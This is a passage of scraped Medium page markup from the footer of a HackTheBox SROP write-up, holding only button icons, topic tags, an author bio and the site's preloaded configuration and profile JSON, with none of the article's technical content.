6.09 0 0 0 3.24 1.54 7.14 7.14 0 0 1-.83-1.84 5.15 5.15 0 0 1-.16-.75 2.4 2.4 0 0 1-.02-.29v-.23l.18-.15a6.6 6.6 0 0 0 2.3-4.96c0-3.82-3.4-6.93-7.6-6.93-4.19 0-7.6 3.11-7.6 6.93 0 3.83 3.41 6.94 7.6 6.94.83 0 1.64-.12 2.41-.35l.28-.08z" fill-rule="evenodd"></path></svg></div></div></button></div></div><div class="oi s"></div></div></div></div></div></div></div></div><div class="es gb mv et mw mx my mz na nb"></div><div><div class="oj hy n aj p"><div class="n p"><div class="aq ar as at au gf aw w"><div class="n cu"></div><div class="n o cu"></div><div class="ok ol s"><div class="n ck hu"><div class="n o ay"><div class="om s"><span class="s on oo op e d"><div class="n o ay"><div class="s ap ns nt nu nv nw"><span><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b27727cd441&amp;operation=register&amp;redirect=https%3A%2F%2Fcorruptedprotocol.medium.com%2Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441&amp;user=Hariharan%40Blog%3A~%24&amp;userId=ec69897f3ac2&amp;source=post_actions_footer-----8b27727cd441---------------------clap_footer-----------" class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow"><div class="cf nx ny nz en oa ob oc r od oe"><svg width="25" height="25" viewBox="0 0 25 25" aria-label="clap"><g fill-rule="evenodd"><path d="M11.74 0l.76 2.97.76-2.97zM14.81 3.78l1.84-2.56-1.42-.47zM8.38 1.22l1.84 2.56L9.8.75zM20.38 21.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M7.1 21.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L4.1 14.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L4.4 10.26 3.22 9.08a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L9.96 13a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L6.43 8.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L18.63 14c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM11 5.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 21 22.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div></div></span><span class="s h g f oq or"><div class="n o ay"><div class="s ap ns nt nu nv nw"><span><a href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8b27727cd441&amp;operation=register&amp;redirect=https%3A%2F%2Fcorruptedprotocol.medium.com%2Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441&amp;user=Hariharan%40Blog%3A~%24&amp;userId=ec69897f3ac2&amp;source=post_actions_footer-----8b27727cd441---------------------clap_footer-----------" class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow"><div class="cf nx ny nz en oa ob oc r od oe"><svg width="25" height="25" viewBox="0 0 25 25" aria-label="clap"><g fill-rule="evenodd"><path d="M11.74 0l.76 2.97.76-2.97zM14.81 3.78l1.84-2.56-1.42-.47zM8.38 1.22l1.84 2.56L9.8.75zM20.38 21.62a5.11 5.11 0 0 1-3.16 1.61l.49-.45c2.88-2.89 3.45-5.98 1.69-9.21l-1.1-1.94-.96-2.02c-.31-.67-.23-1.18.25-1.55a.84.84 0 0 1 .66-.16c.34.05.66.28.88.6l2.85 5.02c1.18 1.97 1.38 5.12-1.6 8.1M7.1 21.1l-5.02-5.02a1 1 0 0 1 .7-1.7 1 1 0 0 1 .72.3l2.6 2.6a.44.44 0 0 0 .63-.62L4.1 14.04l-1.75-1.75a1 1 0 1 1 1.41-1.41l4.15 4.15a.44.44 0 0 0 .63 0 .44.44 0 0 0 0-.62L4.4 10.26 3.22 9.08a1 1 0 0 1 0-1.4 1.02 1.02 0 0 1 1.41 0l1.18 1.16L9.96 13a.44.44 0 0 0 .62 0 .44.44 0 0 0 0-.63L6.43 8.22a.99.99 0 0 1-.3-.7.99.99 0 0 1 .3-.7 1 1 0 0 1 1.41 0l7 6.98a.44.44 0 0 0 .7-.5l-1.35-2.85c-.31-.68-.23-1.19.25-1.56a.85.85 0 0 1 .66-.16c.34.06.66.28.88.6L18.63 14c1.57 2.88 1.07 5.54-1.55 8.16a5.62 5.62 0 0 1-5.06 1.65 9.35 9.35 0 0 1-4.93-2.72zM11 5.98l2.56 2.56c-.5.6-.56 1.41-.15 2.28l.26.56-4.25-4.25a.98.98 0 0 1-.12-.45 1 1 0 0 1 .29-.7 1.02 1.02 0 0 1 1.41 0zm8.89 2.06c-.38-.56-.9-.92-1.49-1.01a1.74 1.74 0 0 0-1.34.33c-.38.29-.61.65-.71 1.06a2.1 2.1 0 0 0-1.1-.56 1.78 1.78 0 0 0-.99.13l-2.64-2.64a1.88 1.88 0 0 0-2.65 0 1.86 1.86 0 0 0-.48.85 1.89 1.89 0 0 0-2.67-.01 1.87 1.87 0 0 0-.5.9c-.76-.75-2-.75-2.7-.04a1.88 1.88 0 0 0 0 2.66c-.3.12-.61.29-.87.55a1.88 1.88 0 0 0 0 2.66l.62.62a1.88 1.88 0 0 0-.9 3.16l5.01 5.02c1.6 1.6 3.52 2.64 5.4 2.96a7.16 7.16 0 0 0 1.18.1c1.03 0 2-.25 2.9-.7A5.9 5.9 0 0 0 21 22.24c3.34-3.34 3.08-6.93 1.74-9.17l-2.87-5.04z"></path></g></svg></div></a></span></div></div></span></div><div class="os n"><div class="n"><button class="en ny cf"><div class="n o ay"><div class="n o"><svg width="29" height="29" aria-label="responses" class="og oh en oe ot"><path d="M21.27 20.06a9.04 9.04 0 0 0 2.75-6.68C24.02 8.21 19.67 4 14.1 4S4 8.21 4 13.38c0 5.18 4.53 9.39 10.1 9.39 1 0 2-.14 2.95-.41.28.25.6.49.92.7a7.46 7.46 0 0 0 4.19 1.3c.27 0 .5-.13.6-.35a.63.63 0 0 0-.05-.65 8.08 8.08 0 0 1-1.29-2.58 5.42 5.42 0 0 1-.15-.75zm-3.85 1.32l-.08-.28-.4.12a9.72 9.72 0 0 1-2.84.43c-4.96 0-9-3.71-9-8.27 0-4.55 4.04-8.26 9-8.26 4.95 0 8.77 3.71 8.77 8.27 0 2.25-.75 4.35-2.5 5.92l-.24.21v.32a5.59 5.59 0 0 0 .21 1.29c.19.7.49 1.4.89 2.08a6.43 6.43 0 0 1-2.67-1.06c-.34-.22-.88-.48-1.16-.74z"></path></svg></div></div></button></div></div></div><div class="n o"><div class="bw" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bw" role="tooltip" aria-hidden="false"><button class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post"><svg width="25" height="25" class="r"><g fill-rule="evenodd"><path d="M15.6 5a.42.42 0 0 0 .17-.3.42.42 0 0 0-.12-.33l-2.8-2.79a.5.5 0 0 0-.7 0l-2.8 2.8a.4.4 0 0 0-.1.32c0 .12.07.23.16.3h.02a.45.45 0 0 0 .57-.04l2-2V10c0 .28.23.5.5.5s.5-.22.5-.5V2.93l2.02 2.02c.08.07.18.12.3.13.11.01.21-.02.3-.08v.01"></path><path d="M18 7h-1.5a.5.5 0 0 0 0 1h1.6c.5 0 .9.4.9.9v10.2c0 .5-.4.9-.9.9H6.9a.9.9 0 0 1-.9-.9V8.9c0-.5.4-.9.9-.9h1.6a.5.5 0 0 0 .35-.15A.5.5 0 0 0 9 7.5a.5.5 0 0 0-.15-.35A.5.5 0 0 0 8.5 7H7a2 2 0 0 0-2 2v10c0 1.1.9 2 2 2h11a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2"></path></g></svg></button></div></div></div><div class="hv s ab"></div></div></div></div><div class="ou ol s"><ul class="cf cg"><li class="bw ov ow ox"><a href="https://medium.com/tag/cybersecurity" class="bb b oy oz dy pa pb bx s kk">Cybersecurity</a></li><li class="bw ov ow ox"><a href="https://medium.com/tag/hackthebox" class="bb b oy oz dy pa pb bx s kk">Hackthebox</a></li><li class="bw ov ow ox"><a href="https://medium.com/tag/hackthebox-writeup" class="bb b oy oz dy pa pb bx s kk">Hackthebox Writeup</a></li><li class="bw ov ow ox"><a href="https://medium.com/tag/srop" class="bb b oy oz dy pa pb bx s kk">Srop</a></li><li class="bw ov ow ox"><a href="https://medium.com/tag/sigrop" class="bb b oy oz dy pa pb bx s kk">Sigrop</a></li></ul></div><div class="pc s"></div></div></div><div><div class="n p"><div class="aq ar as at au gf aw w"></div></div><div class="s hu"><div class="pd no s pe"><div class="n p"><div class="aq ar as at au gf aw w"><div class="n o ck"><h2 class="bb da pf pg ph ik pi pj pk io pl pm pn is po pp pq iw pr ps pt ja ks pu pv pw px py hd"><a class="eb ec ca cb cc cd ce cf cg bm ed ee ch ef eg" rel="noopener follow" href="/?source=follow_footer-----8b27727cd441--------------------------------">More from Hariharan@Blog:~$</a></h2><div class="hk n"><span><button class="do b bc bd nj bf nk nl ff nm fi bm bn bo nn fl bs bt bu bv bw bx">Follow</button></span><div class="hk s"></div></div></div><div class="mr s"><p class="bb b bc bd dy">Computer Science Student @ SASTRA deemed to be University .</p></div></div></div></div></div><div class="pz s pe hu"><div class="n p"><div class="mh mj ml qa qb id aw w"></div></div></div><div class="s fs hu"><div class="n p"><div class="aq ar as at au av aw w"></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20211014-124622-7b10e9e6e4"</script><script>window.__GRAPHQL_URI__ = "https://corruptedprotocol.medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"auroraPage":{"isAuroraPageEnabled":true},"bookReader":{"assets":{},"reader":{"currentAsset":null,"currentGFI":null,"settingsPanelIsOpen":false,"settings":{"fontFamily":"CHARTER","fontScale":"M","publisherStyling":false,"textAlignment":"start","theme":"White","lineSpacing":0,"wordSpacing":0,"letterSpacing":0},"internalNavCounter":0,"currentSelection":null}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-8b27727cd441","user-ec69897f3ac2"],"serverVariantState":"8489024ae65cb023b2a48f1529329bef7169bdf1c9b694f20d3bb87992a9abb6","middlewareEnabled":true,"cacheStatus":"DYNAMIC","vary":[]},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"routingEntity":{"type":"USER","id":"ec69897f3ac2","explicit":true}},"debug":{"requestId":"b5ccc060-d375-4d2a-a3cb-b81542061b3a","hybridDevServices":[],"showBookReaderDebugger":false,"originalSpanCarrier":{"ot-tracer-spanid":"73c0ef9d397b9134","ot-tracer-traceid":"4abeda468136e7d","ot-tracer-sampled":"true"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedGoogleOneTap":null,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fcorruptedprotocol.medium.com\u002Fsickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441","host":"corruptedprotocol.medium.com","hostname":"corruptedprotocol.medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"queryString":"","currentHash":""},"tracing":{},"config":{"nodeEnv":"production","version":"main-20211014-124622-7b10e9e6e4","isTaggedVersion":false,"isMediumDotApp":false,"isMediumDotAppVariant":false,"target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","lightStep":{"name":"lite-web","host":"lightstep.medium.systems","token":"ce5be895bef60919541332990ac9fef2","appVersion":"main-20211014-124622-7b10e9e6e4","disableClientReporting":false},"algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20211014-124622-7b10e9e6e4","commit":"7b10e9e6e479d44604ca08ba932913c58561b22d"}},"datacenter":"us"},"googleAnalyticsCode":"UA-24232453-2","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium"},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"1*OMF3fSqH8t4xBJ9-6oZDZw.png","height":106,"width":545},"postLogo":{"imageId":"1*kFrc4tBFM_tCis-2Ic87WA.png","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl"},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","meterPost({\"postId\":\"8b27727cd441\",\"postMeteringOptions\":{\"referrer\":\"https:\u002F\u002Fmedium.com\u002Fp\u002F8b27727cd441\u002Fedit\",\"sk\":null,\"source\":null}})":{"__ref":"MeteringInfo:{}"},"postResult({\"id\":\"8b27727cd441\"})":{"__ref":"Post:8b27727cd441"}},"User:ec69897f3ac2":{"id":"ec69897f3ac2","__typename":"User","username":"corruptedprotocol","name":"Hariharan@Blog:~$","imageId":"1*XeO4n8OHQj91HU2b0XXmyw.jpeg","mediumMemberAt":0,"hasPastMemberships":false,"isPartnerProgramEnrolled":false,"email":"hariharan252001@gmail.com","unverifiedEmail":"","createdAt":1614078961137,"isAuroraVisible":true,"isEligibleToViewNewResponses":true,"isMembershipTrialEligible":true,"isSuspended":false,"styleEditorOnboardingVersionSeen":0,"allowEmailAddressSharingEditorWriter":false,"hasSubdomain":true,"dismissableFlags":["STORIES_BOOKMARK_TOOLTIP","BLOGROLL_ENABLE","AURORA_NAV_AVAILABLE","FOLLOWERS_TOOLTIP"],"hasWebMembershipTrialEnabled":false,"hasGroupGiftingEnabled":false,"twitterScreenName":"Corruptedhari","geolocation":{"__typename":"Geolocation","country":"IN"},"atsQualifiedAt":1628556329187,"postSubscribeMembershipUpsellShownAt":0,"hightowerTermsAcceptedAt":1628026019288,"newsletterV3":{"__ref":"NewsletterV3:c8e0e297b508"},"customStyleSheet":{"__ref":"CustomStyleSheet:64a7b5dd3aa7"},"bio":"Computer Science Student @ SASTRA deemed to be University .","hasCompletedProfile":true,"socialStats":{"__typename":"SocialStats","followerCount":33,"followingCount":21,"collectionFollowingCount":2},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"corruptedprotocol.medium.com","status":"ACTIVE","isSubdomain":true}},"viewerEdge":{"__ref":"UserViewerEdge:userId:ec69897f3ac2-viewerId:ec69897f3ac2"},"bookAuthor":null,"viewerIsUser":true,"homepagePostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__ref":"Post:8b27727cd441"}]},"allowNotes":true,"replyToEmailBannerShownCount":0,"followedCollections":2},"MeteringInfo:{}":{"__typename":"MeteringInfo","postIds":[],"maxUnlockCount":3,"unlocksRemaining":0},"CustomStyleSheet:64a7b5dd3aa7":{"id":"64a7b5dd3aa7","__typename":"CustomStyleSheet","blogroll":{"__typename":"BlogrollConfiguration","visibility":"BLOGROLL_VISIBILITY_SIDEBAR"},"global":{"__typename":"GlobalStyles","colorPalette":{"__typename":"StyleSheetColorPalette","primary":{"__typename":"ColorValue","colorPalette":{"__typename":"ColorPalette","tintBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FF94fb2c","colorPoints":[{"__typename":"ColorPoint","color":"#FF94FB2C","point":0},{"__typename":"ColorPoint","color":"#FF85EA15","point":0.1},{"__typename":"ColorPoint","color":"#FF76D800","point":0.2},{"__typename":"ColorPoint","color":"#FF67C600","point":0.3},{"__typename":"ColorPoint","color":"#FF57B400","point":0.4},{"__typename":"ColorPoint","color":"#FF47A100","point":0.5},{"__typename":"ColorPoint","color":"#FF358D00","point":0.6},{"__typename":"ColorPoint","color":"#FF227800","point":0.7},{"__typename":"ColorPoint","color":"#FF0A6100","point":0.8},{"__typename":"ColorPoint","color":"#FF004900","point":0.9},{"__typename":"ColorPoint","color":"#FF002D00","point":1}]},"highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFE1FDC5","point":0},{"__typename":"ColorPoint","color":"#FFDBFDBC","point":0.1},{"__typename":"ColorPoint","color":"#FFD5FDB2","point":0.2},{"__typename":"ColorPoint","color":"#FFD0FDA8","point":0.3},{"__typename":"ColorPoint","color":"#FFCAFC9E","point":0.4},{"__typename":"ColorPoint","color":"#FFC4FC94","point":0.5},{"__typename":"ColorPoint","color":"#FFBFFC8A","point":0.6},{"__typename":"ColorPoint","color":"#FFB9FB80","point":0.7},{"__typename":"ColorPoint","color":"#FFB3FB75","point":0.8},{"__typename":"ColorPoint","color":"#FFADFA6B","point":0.9},{"__typename":"ColorPoint","color":"#FFA8F95F","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF429C00","point":0},{"__typename":"ColorPoint","color":"#FF409100","point":0.1},{"__typename":"ColorPoint","color":"#FF3D8500","point":0.2},{"__typename":"ColorPoint","color":"#FF3A7A00","point":0.3},{"__typename":"ColorPoint","color":"#FF366E00","point":0.4},{"__typename":"ColorPoint","color":"#FF326200","point":0.5},{"__typename":"ColorPoint","color":"#FF2D5501","point":0.6},{"__typename":"ColorPoint","color":"#FF274905","point":0.7},{"__typename":"ColorPoint","color":"#FF203B07","point":0.8},{"__typename":"ColorPoint","color":"#FF192D06","point":0.9},{"__typename":"ColorPoint","color":"#FF101E04","point":1}]}}},"background":null},"fonts":{"__typename":"StyleSheetFonts","font1":{"__typename":"StyleSheetFont","name":"SERIF_1"},"font2":{"__typename":"StyleSheetFont","name":"SERIF_1"},"font3":{"__typename":"StyleSheetFont","name":"SERIF_1"}}},"header":{"__typename":"HeaderStyles","backgroundColor":{"__typename":"ColorValue","colorPalette":{"__typename":"ColorPalette","tintBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FF171515","colorPoints":[{"__typename":"ColorPoint","color":"#FF171515","point":0},{"__typename":"ColorPoint","color":"#FF363434","point":0.1},{"__typename":"ColorPoint","color":"#FF514F4F","point":0.2},{"__typename":"ColorPoint","color":"#FF6A6767","point":0.3},{"__typename":"ColorPoint","color":"#FF817E7E","point":0.4},{"__typename":"ColorPoint","color":"#FF979494","point":0.5},{"__typename":"ColorPoint","color":"#FFADA9A9","point":0.6},{"__typename":"ColorPoint","color":"#FFC1BEBD","point":0.7},{"__typename":"ColorPoint","color":"#FFD5D1D1","point":0.8},{"__typename":"ColorPoint","color":"#FFE8E5E4","point":0.9},{"__typename":"ColorPoint","color":"#FFFBF8F7","point":1}]}},"rgb":"171515","alpha":"b2"},"postBackgroundColor":null,"backgroundImage":{"__ref":"ImageMetadata:1*T4KikCjZBOeUAsRxS8e3hQ.jpeg"},"headerScale":"HEADER_SCALE_MEDIUM","horizontalAlignment":"CENTER","backgroundImageDisplayMode":"IMAGE_DISPLAY_MODE_TILE","backgroundImageVerticalAlignment":"CENTER","backgroundColorDisplayMode":"COLOR_DISPLAY_MODE_VERTICAL_GRADIENT","secondaryBackgroundColor":null,"nameColor":{"__typename":"ColorValue","rg